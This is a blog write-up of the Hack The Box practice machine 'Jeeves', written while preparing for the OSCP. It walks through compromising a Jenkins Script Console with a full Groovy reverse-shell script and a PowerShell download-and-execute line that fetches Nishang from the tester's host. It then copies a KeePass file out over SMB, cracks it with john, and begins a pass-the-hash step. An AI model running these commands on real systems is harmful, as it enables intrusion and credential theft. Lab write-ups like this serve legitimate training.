---
title:  "Hack The Box / Jeeves"
date: 2020-01-18
tags: [Penetration Testing, Hacking, Hack The Box, Jeeves, OSCP, Offensive Security]
header: 
  image: "assets/images/jeeves/jeeves-rooted.jpg"
---

Welcome! So, before starting with couple ways of getting this box, I want to explain the goal of this and the following posts. After two attempts to pass my OSCP exam (which both attemps failed) I looked the need to practice and explain some of the learning obtained with different machines in Hack The Box, so I decided to make some challenging boxes before my third attempt to the OSCP exam. I chose this list from [NetSec Focus](https://www.netsecfocus.com/) in order to improve my penetration testing skills. From this list Jeeves is the first box, so let's get to it. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/list.jpg" alt="oscp list">

## Information Gathering

### Nmap Scan
So, we start with a nmap scan to check what ports are open and what services are running in this machine. 

```
nmap -sC -sV -p- -oN scan.nmap 10.10.10.63
```
<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/nmap-scan.png" alt="nmap scan">

Looks like we have some HTTP services running in port 80 and 50000. Also we can deduce that the machine is running Windows due to the IIS server. There is a good chance to scan the port 445 which is running a SMB service, but unfortunately the results are not helpful. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/nmap-scripts.png" alt="smb scan">

### Directory Brute Force
Then, having HTTP service running in port 80 and 50000 and running [dirsearch](https://github.com/maurosoria/dirsearch) in both ports, we get some good results in port 50000.

Results from browser and dirsearch running in port 80. 
<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/browser-80.png" alt="browser">

```
python3 dirsearch.py -u http://10.10.10.63 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php -t 50
```
<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/dir-80.png" alt="dirsearch">

Results rom browser and dirsearch running in port 50000.

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/not-found.png" alt="browser">

```
python3 dirsearch.py -u http://10.10.10.63:50000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php -t 50
```
<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/dir-50000.png" alt="dirsearch">

Bingo! We have something to look at __http://10.10.10.63/askjeeves/__

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/jenkins.png" alt="browser">

So, after visitin this page and looking around things, in __"Manage Jenkins"__ there is something interesting called __"Script Console"__, and after googling around its exploitation we found something useful from [Hacking Articles](https://www.hackingarticles.in/exploiting-jenkins-groovy-script-console-in-multiple-ways/).

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/jenkins-manage.png" alt="Manage Jenkins">

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/script-console.png" alt="Script Console">

## Reverse Shell
Knowing that we can do some exploitation with the script console in Jenkins. There are couple methods to get a reverse shell where I'll share two. 

### Reverse Shell - Method #1
After googling around things such as "jenkins language scripting" or "jenkins reverse shell" there is information that says that the langauage used to execute scripts in the console is called "Groovy". So, from this language the reverse shell obtained came from ["frohoff"](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) on github. 

```
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Then, adding this code and replace "localhost" for our IP and cliking "Run" I got a reverse shell!

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/reverse-shell1.png" alt="Reverse Shell #1">

and wollah!

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/netcat-shell.png" alt="NetCat Shell #1">

### Reverse Shell - Method #2

It keeps the same concept from the Script Console and Groovy Scripting language with the difference and usage of powershell. This method came from [IppSec](https://www.youtube.com/watch?v=EKGBskG8APc) in his video resolving Jeeves, so let's get it. 

So, before attempting this method, the usage of the reverse shell from [Nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) and having a simple http server from python is important.

In Nishang we can add ``` Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.63 -Port 4444 ``` in the __last line__ of code as is shown in the picture below. The reason why adding this line is because at the time to execute the script in powershell we want to invoke the reverse shell to our respective IP with the respective port. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/nishang-modify.png" alt="nishang-modify">

After adding that line of code, we can start our python Simple HTTP Server in our location where we have our nishang script. 

```
python -m SimpleHTTPServer 80
```

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/python-server.png" alt="python-server">

After starting the server we should write and execute the following lines in the Script Console where our order will be to download the nishang script from our local host and executed in the remote machine invoking a reverse shell to our local host. 

Groovy code for the Script Console:
```
cmd = """ powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.36/Invoke-PowerShellTcp.ps1') """
println cmd.execute().txt
```

Powershell script to download the nishang script (might be useful for future machinesツ) :
```
(New-Object Net.WebClient).downloadString('http://10.10.14.36/Invoke-PowerShellTcp.ps1')
```

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/power-console.png" alt="power-console">

So, wollah!

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/shell-gif.gif" alt="shell-gif">

## Getting the user flag

Once the reverse shell is obtained, it is not possible to move back from the directory because we don't have the privileges to do it due to our location in the administrator folder, but it's possible to list the files in the current directory, but that not helps too much. 

Note: If the reverse shell is obtained through the powershell method we can move back directories with no problem, but can't list the files in the Administrator folder due to lack of privileges. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/access-denied.png" alt="access-denied">

Then, we can move directly to the "users" folder with no problem, list the available users and obtain the users flag!

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/user.png" alt="user flag">

## Getting root flag

To get the root flag there are two ways to get it where one compromises a file that has been gotten from the Documents directory within the user and the other way is using [RottenPotato](https://github.com/foxglovesec/RottenPotato) to scalate to root. 

### Getting root flag - Method #1
After looking around in the directories from the user __kohsuke__, there is a file in the Documents directory with __kdbx__ extension. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/list-documents.png" alt="list-documents">

After googling "kdbx extension", it gave a result saying that extension comes from a password manager called "KeePassX". So, the idea now is to transfer the file "CEH.kdbx" to our machine. To do this, the usage of the [smbserver from impacket](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) will be helpful. This method has been learned from [The Cyber Jedi](http://thecyberjedi.com/). 

From our machine:
```
smbserver SAM kohsuke 
```
<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/smbserver.png" alt="smbserver">

Before executing any comand in Jeeves, remember to create the folder where you want to transfer the files, in this case the folder name is __kohsuke__.

In Jeeves:
```
net use s: \\10.10.14.36\SAM
```
and then 
```
copy CEH.kdbx s:
```

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/copy.png" alt="copy">

From the smbserver it's going to appear the connection made with Jeeves, and in the folder __kohsuke__ will appear the file that we copied from Jeeves. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/transfer-done.png" alt="transfer-done">

Now that the file is in the local machine, we can use KeePassX in order to open this file. To install KeePassX in Kali Linux is simple as:
```
apt-get install keepassx 
```
Once KeePassX is installed, we can find it in the application menu toolbar. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/keepassx.png" alt="keepassx">

To open the file that we transfer from Jeeves in KeePassX the steps are:
1. Click in "Database"
2. Click in "Open database" or Ctrl + O
3. Select the location.
4. Open

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/need-pass.png" alt="need-pass">

Then we need a password. This password can be cracked with "John The Ripper" which will extract a hash from the keypass file using __keepass2john__. The following command will execute __keepass2john__ to extrack the hash from the file. 

```
keepass2john CEH.kdbx > CEH
```

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/CEH.png" alt="CEH">

This is the hash once is extracted. 

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/CEH-hash.png" alt="CEH-hash">

Once the file is extracted, we can crack the hash using __john__ and the common wordlist __rockyou.txt__. To do this we execute the following commands. 

```
john CEH -w:/usr/share/wordlists/rockyou.txt
```

and then

```
john CEH --show
```

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/hash-cracked.png" alt="hash-cracked">

After obtaining the password which is ```monshine1```, it is possible to access to the password manager. Once in the password manager and looking around to different passwords, the most interesting is __"Backup stuff"__.

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/backup.png" alt="backup">

Information Obtained in  __"Backup stuff"__

<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/backup-hash.png" alt="backup-hash">

The information obtained from here will because is hash NTLM valid for an user. To get access to the machine, there is a technique called ["Pass The Hash"](https://en.wikipedia.org/wiki/Pass_the_hash) where we can get access to the system through a tool called ["pth-winexe"](https://www.kali.org/penetration-testing/passing-hash-remote-desktop/)

